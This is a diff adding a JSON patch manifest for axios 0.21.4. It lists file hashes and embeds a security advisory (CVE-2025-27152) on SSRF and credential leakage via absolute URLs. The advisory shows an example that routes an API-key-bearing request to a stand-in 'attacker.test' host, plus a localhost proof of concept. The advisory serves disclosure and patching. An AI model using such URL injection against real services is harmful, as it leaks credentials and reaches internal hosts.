@@ -1,0 +1,39 @@
+{
+  "patches": {
+    "pkg:npm/axios@0.21.4": {
+      "uuid": "28328c33-fd8c-4f7e-bcdf-744523214af2",
+      "exportedAt": "Fri, 16 Jan 2026 06:48:33 GMT",
+      "files": {
+        "package/dist/axios.js": {
+          "beforeHash": "28a4b3bf5336a1a877fe355a1a2a9bd6dbcca2406d352a4dd40acdbe5a63fc01",
+          "afterHash": "ca51f5b0144bbfe43fe337f758b104b5166d1b700762987a87059f4799896e1c"
+        },
+        "package/lib/adapters/http.js": {
+          "beforeHash": "b6c93b905df78f6f3f8896595d5ff84daea0dd3742bd63ac3d5abf614b546086",
+          "afterHash": "75eea6e18deb9d648e2c56e2d4c0a42753f9f0826a0cf4917d037b59a81077ae"
+        },
+        "package/lib/adapters/xhr.js": {
+          "beforeHash": "4327a42d2e5dd4335e69389fd0941ae6b13bd0e10e412e5f0a9ac80717d293b9",
+          "afterHash": "0330712184c8f6cb7c28c32ce3b500d7700c22a3c35cfb6d704e5bdeeb23d6df"
+        },
+        "package/lib/core/buildFullPath.js": {
+          "beforeHash": "3c30734f157290978d4c078ffffbfe47be1a894f4e7f88f20dd409e1f4ca584d",
+          "afterHash": "9527899f906b4ced79a2893b0c92b024e9daa05951cac673931ad2a31aaa1646"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-jr5f-v2jv-69x6": {
+          "cves": [
+            "CVE-2025-27152"
+          ],
+          "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
+          "severity": "HIGH",
+          "description": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
